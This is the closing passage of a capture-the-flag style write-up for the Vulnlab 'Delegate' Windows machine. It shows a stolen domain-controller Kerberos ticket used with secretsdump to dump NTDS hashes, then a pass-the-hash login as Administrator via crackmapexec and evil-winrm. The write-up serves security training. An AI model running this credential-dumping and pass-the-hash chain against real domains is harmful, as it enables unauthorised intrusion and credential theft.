<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ cp &#x27;DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache&#x27; dc.ccache</span><br><span class="line"></span><br><span class="line">└─$ export KRB5CCNAME=dc.ccache</span><br></pre></td></tr></table></figure>

<p>We can now dump the secrets of the DC with our ticket using <code>secretsdump</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ impacket-secretsdump -k dc1.delegate.vl</span><br><span class="line">......</span><br><span class="line">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>

<p>If you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ crackmapexec winrm 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class="line">SMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class="line">HTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman</span><br><span class="line">WINRM       10.10.92.191    5985   DC1              [+] delegate.vl\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ evil-winrm --ip 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"> </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ..\Desktop\root.txt</span><br><span class="line">VL[...snip...]</span><br></pre></td></tr></table></figure>

<p>Now that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I’ve only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the <code>MachineAccountQuota</code> attribute is something that is definitely helpful as part of the exploit process.</p>
<p>Big thanks to <code>geiseric</code> for creating this machine.</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">https://github.com/dirkjanm/BloodHound.py</a><br><a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a><br><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html">https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html</a><br><a target="_blank" rel="noopener" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a><br><a target="_blank" rel="noopener" href="https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html">https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html</a><br><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained">https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained</a><br><a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota">https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota</a><br><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnlab/">Vulnlab</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Medium/">Medium</a></div><div class="post_share"><div class="social-share" data-image="/images/vulnlab/delegate-vl/delegate_slide.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/30/mailing/" title="Mailing - Hack The Box"><img class="cover" src="/images/hackthebox/Mailing/mailing.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Mailing - Hack The Box</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/26/tea/" title="Tea - Vulnlab"><img class="cover" src="/images/vulnlab/tea-vl/tea_slide.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Tea - Vulnlab</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/08/26/tea/" title="Tea - Vulnlab"><img class="cover" src="/images/vulnlab/tea-vl/tea_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-26</div><div class="title">Tea - Vulnlab</div></div></a></div><div><a href="/2024/06/05/trusted/" title="Trusted - Vulnlab"><img class="cover" src="/images/vulnlab/trusted-vl/trusted_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-05</div><div class="title">Trusted - Vulnlab</div></div></a></div><div><a href="/2024/06/30/mailing/" title="Mailing - Hack The Box"><img class="cover" src="/images/hackthebox/Mailing/mailing.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Mailing - Hack The Box</div></div></a></div><div><a href="/2024/06/30/driver/" title="Driver - Hack The Box"><img class="cover" src="/images/hackthebox/Driver/driver.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Driver - Hack The Box</div></div></a></div><div><a href="/2024/06/30/Driver-Hack-The-Box/" title="Driver - Hack The Box"><img class="cover" src="/images/hackthebox/Driver/driver.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Driver - Hack The Box</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/cyber.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youssef Achtatal</div><div class="author-info__description">Pentesting & Windows security research</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DaZ-CYBER" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/youssef-achtatal-5642a52b1/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.instagram.com/_danny_feli_/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from Vulnlab & HTB, along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GenericWrite-over-N-Thompson"><span class="toc-text">GenericWrite over N.Thompson</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SeEnableDelegationPrivilege-and-MAQs"><span class="toc-text">SeEnableDelegationPrivilege and MAQs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploiting-Unconstrained-Delegation"><span class="toc-text">Exploiting Unconstrained Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/11/ewptx/" title="eWPTX Certification"><img src="/images/certs/eWPTXv2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="eWPTX Certification"/></a><div class="content"><a class="title" href="/2024/09/11/ewptx/" title="eWPTX Certification">eWPTX Certification</a><time datetime="2024-09-11T13:00:00.000Z" title="Created 2024-09-11 09:00:00">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/tea/" title="Tea - Vulnlab"><img src="/images/vulnlab/tea-vl/tea_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tea - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/26/tea/" title="Tea - Vulnlab">Tea - Vulnlab</a><time datetime="2024-08-26T15:48:36.000Z" title="Created 2024-08-26 11:48:36">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img src="/images/vulnlab/delegate-vl/delegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Delegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/30/delegate/" title="Delegate - Vulnlab">Delegate - Vulnlab</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/mailing/" title="Mailing - Hack The Box"><img src="/images/hackthebox/Mailing/mailing.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Mailing - Hack The Box"/></a><div class="content"><a class="title" href="/2024/06/30/mailing/" title="Mailing - Hack The Box">Mailing - Hack The Box</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/driver/" title="Driver - Hack The Box"><img src="/images/hackthebox/Driver/driver.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Driver - Hack The Box"/></a><div class="content"><a class="title" href="/2024/06/30/driver/" title="Driver - Hack The Box">Driver - Hack The Box</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youssef Achtatal</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">website</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>